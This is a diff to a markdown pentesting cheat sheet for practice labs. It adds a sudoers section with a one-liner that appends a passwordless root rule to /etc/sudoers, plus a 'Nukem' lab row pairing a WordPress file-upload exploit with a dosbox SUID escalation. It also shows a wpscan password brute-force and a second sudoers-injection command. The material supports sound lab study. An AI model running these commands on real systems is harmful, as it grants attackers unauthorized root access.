@@ -220,12 +220,15 @@ wpscan --url $URL
 wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames $USERNAME
 ```
 
-
 ### debugfs
 list all 
 ```
 df -h  
 debugfs PATH
+```
+### sudoers
+```
+echo 'commander ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
 ```
 
 ## Walkthrough Labs
@@ -374,6 +377,7 @@ The most commonly used tools
 |Levram|Easy||[Gerapy 0.9.7 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50640)|`Python`
 |Mzeeav|Easy|dirsearch|bypass upload shell|`fileS` (SUID)|
 |Nibbles|Intermediate|PostgreSQL|[PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50847)|`find` (SUID)|
+|Nukem|Hard||[WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload](https://www.exploit-db.com/exploits/48979)|manually examining, `dosbox` (SUID)|
 |Ochima|Intermediate||[Maltrail v0.53 Unauthenticated OS Command Injection (RCE)](https://github.com/spookier/Maltrail-v0.53-Exploit)|`echo 'echo "snort ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> etc_Backup.s`|
 |PC|Intermediate|||[rpc.py 0.6.0 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50983)|
 |Pelican|Intermediate||[Exhibitor Web UI 1.7.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48654)|`gcore` (SUID)|
@@ -394,10 +398,9 @@ The most commonly used tools
 - [ ] [Clue]()
 - [ ] [Hetemit]()
 - [ ] [Hunit]()
-
 - [ ] [Mantis]()
 - [ ] [Marketing]()
-- [ ] [Nukem]()
+
 - [ ] [Payday]()
 - [ ] [Pebbles]()
 - [ ] [Peppo]()
